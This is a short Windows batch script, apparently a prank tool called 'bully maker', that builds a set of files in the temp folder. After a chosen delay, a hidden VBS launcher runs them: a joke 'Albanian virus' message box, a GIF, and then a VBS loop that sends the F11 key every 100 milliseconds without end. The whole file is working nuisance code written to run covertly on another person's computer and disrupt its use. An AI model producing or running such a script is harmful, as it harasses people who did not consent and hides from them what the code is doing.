@echo off
color a && mode con: cols=75 lines=20

title bully maker && set timer = 120
echo [+] Enter the amount of time to wait in seconds && set /p timer=[+] before the prank is started (default:120)[+] 

md %tmp%\bully\ && echo [*] Created directory
echo X=MsgBox("Hi, I am an Albanian virus but because of poor technology in my country unfortunately I am not able to harm your computer. Please be so kind to delete some of your important files yourself and then forward me to other users. Many thanks for your cooperation! Best regards, Albanian virus.",4+64,"Virus alert") > %tmp%\bully\albanian.vbs && echo [*] Meme albanian virus created

copy bully.gif %tmp%\bully\bully.gif && echo [*] Gif created
echo set x=wscript.createobject ("wscript.shell") > %tmp%\bully\tamper.vbs
echo do >> %tmp%\bully\tamper.vbs
echo wscript.sleep 100 >> %tmp%\bully\tamper.vbs
echo x.sendkeys "{F11}" >> %tmp%\bully\tamper.vbs
echo loop >> %tmp%\bully\tamper.vbs
echo timeout /t %timer% > %tmp%\bully\main.bat
echo start albanian.vbs >> %tmp%\bully\main.bat
echo timeout /t 30 >> %tmp%\bully\main.bat
echo bully.gif >> %tmp%\bully\main.bat
echo timeout /t 3 >> %tmp%\bully\main.bat
echo tamper.vbs >> %tmp%\bully\main.bat
echo Set oShell = CreateObject ("Wscript.Shell") > %tmp%\bully\main.vbs
echo Dim strArgs >> %tmp%\bully\main.vbs
echo strArgs = "cmd /c %tmp%\bully\main.bat" >> %tmp%\bully\main.vbs
echo oShell.Run strArgs, 0, false >> %tmp%\bully\main.vbs

echo [*] Create other required files
echo [+] Done 
pause
start %tmp%\bully\main.vbs
